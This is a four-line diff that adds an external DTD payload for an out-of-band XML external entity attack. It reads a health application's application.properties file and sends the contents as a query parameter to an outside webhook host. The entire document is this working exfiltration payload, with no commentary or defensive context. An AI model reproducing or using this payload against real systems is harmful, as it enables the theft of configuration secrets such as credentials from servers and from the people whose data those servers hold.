@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///healthapp/target/classes/application.properties">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://jolly-mouse-40.webhook.cool/?d=%file;'>">
+%eval;
+%exfil;
